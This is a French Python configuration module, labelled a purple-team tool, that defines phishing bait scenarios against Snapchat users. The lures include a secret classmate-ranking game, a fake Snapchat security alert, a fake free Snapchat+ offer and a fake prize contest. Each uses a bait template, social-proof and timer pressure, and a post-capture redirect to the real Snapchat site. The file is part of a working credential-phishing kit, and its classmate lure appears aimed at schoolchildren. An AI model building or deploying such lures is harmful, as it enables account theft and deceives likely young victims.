"""
╔══════════════════════════════════════════════════════════════╗
║  SCÉNARIOS D'APPÂTS — Purple Team Tool                      ║
║  Différents thèmes pour le bait selon la cible              ║
╚══════════════════════════════════════════════════════════════╝
"""

SCENARIOS = {
    "classement": {
        "id": "classement",
        "name": "🏆 Classement Secret",
        "desc": "Jeu de vote anonyme pour noter les gens de sa classe",
        "bait_template": "bait.html",
        "capture_success": "https://accounts.snapchat.com",
        "color": "#FF3366",
        "social_proof": True,
        "timer": True,
        "categories": 5,
    },
    "securite": {
        "id": "securite",
        "name": "🔐 Alerte de sécurité",
        "desc": "Fausse alerte Snapchat demandant une vérification",
        "bait_template": "scenario_securite.html",
        "capture_success": "https://accounts.snapchat.com",
        "color": "#ba1a1a",
        "social_proof": True,
        "timer": True,
        "categories": 0,
    },
    "snapchat_plus": {
        "id": "snapchat_plus",
        "name": "🎁 Snapchat+ Gratuit",
        "desc": "Fausse offre Snapchat+ pour activer son accès",
        "bait_template": "scenario_snapchat_plus.html",
        "capture_success": "https://accounts.snapchat.com",
        "color": "#FFFC00",
        "social_proof": True,
        "timer": True,
        "categories": 0,
    },
    "cadeau": {
        "id": "cadeau",
        "name": "🎀 Cadeau Mystère",
        "desc": "Faux concours avec un cadeau à gagner",
        "bait_template": "scenario_cadeau.html",
        "capture_success": "https://snapchat.com",
        "color": "#FFD700",
        "social_proof": True,
        "timer": True,
        "categories": 0,
    },
}

SCENARIO_ORDER = ["classement", "securite", "snapchat_plus", "cadeau"]


def get_scenario(scenario_id):
    """Retourne un scénario par son ID."""
    return SCENARIOS.get(scenario_id, SCENARIOS["classement"])


def list_scenarios():
    """Liste tous les scénarios disponibles."""
    return [SCENARIOS[sid] for sid in SCENARIO_ORDER if sid in SCENARIOS]


def get_bait_path(scenario_id):
    """Retourne le chemin du template bait pour un scénario."""
    scenario = get_scenario(scenario_id)
    template = scenario["bait_template"]
    if template == "bait.html":
        return "bait.html"
    return f"scenarios/{template}"
